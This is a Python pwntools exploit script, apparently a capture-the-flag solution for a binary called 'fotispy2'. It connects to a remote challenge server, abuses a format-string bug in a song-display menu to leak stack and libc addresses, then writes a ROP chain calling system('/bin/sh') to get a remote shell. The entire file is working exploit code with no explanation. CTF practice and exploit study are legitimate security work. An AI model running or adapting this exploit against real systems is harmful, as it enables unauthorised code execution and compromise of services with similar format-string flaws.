from pwn import *

context.log_level = "debug"
context.arch = "amd64"
context.os = "linux"
context.terminal = ["/usr/bin/tmux", "sp", "-h"]

f_remote = True if "remote" in sys.argv else False
f_gdb = True if "gdb" in sys.argv else False

vuln_path = "./fotispy2.patch"
elf = ELF(vuln_path)
libc = elf.libc

io = process([vuln_path]) if not f_remote else remote("52.59.124.14", 5192)


def ddebug(b=""):
    if not f_gdb: return
    gdb.attach(io, gdbscript=b)
    pause()


# u64(io.recvuntil("\x7f")[-6:].ljust(8, b"\x00"))


def register(name, pwd):
    io.sendlineafter("your choice [4]: ", "0")
    io.sendlineafter("username:", name)
    io.sendlineafter("password:", pwd)


def login(name, pwd):
    io.sendlineafter("your choice [4]: ", "1")
    io.sendlineafter("username:", name)
    io.sendlineafter("password:", pwd)


def addasong(title, who, album):
    io.sendlineafter("your choice [4]: ", "2")
    io.sendlineafter("title:", title)
    io.sendlineafter("from:", who)
    io.sendlineafter("is on:", album)


def display():
    io.sendlineafter("your choice [4]: ", "3")


idx = 0x00004070

register("tinyfat", "tinyfat")
login("tinyfat", "tinyfat")

addasong("a" * 0x500, "b" * 0x4fc, "c" * 0x1c)
addasong("--%9$p--%52125$p--", "from", "album")
display()

io.recvuntil("--", drop=True)
leak = int(io.recvuntil("--", drop=True), 16)
log.success("leak:-----> " + hex(leak))
ret_addr = leak - 0x1c
log.success("retaddr :-----> " + hex(ret_addr))

leak = int(io.recvuntil("--", drop=True), 16)
log.success("leak:-----> " + hex(leak))
libc.address = leak - 0x2724a
log.success("libc.address :-----> " + hex(libc.address))

one_gadget = [0x4c139, 0x4c140, 0xd515f]
value = libc.address + one_gadget[2]

system_addr = libc.symbols.get("system")
binsh_addr = next(libc.search("/bin/sh"))
pop_rdi = next(libc.search(asm("pop rdi; ret")))

write = {
    ret_addr: pop_rdi,
    ret_addr + 8: binsh_addr,
    ret_addr + 8 * 2: pop_rdi,
    ret_addr + 8 * 3: 0xff0000000000,
    ret_addr + 8 * 4: pop_rdi,
    ret_addr + 8 * 5: binsh_addr,
    ret_addr + 8 * 6: libc.address + 0x26e99,
    ret_addr + 8 * 7: system_addr,
}
payload = fmtstr_payload(334 + 6, write, numbwritten=0x20, write_size="byte")

addasong(payload, "from", "album")
ddebug("breakrva 0x001887\n breakrva 0x00172F\n breakrva 0x0018f2\n continue")
display()

io.interactive()
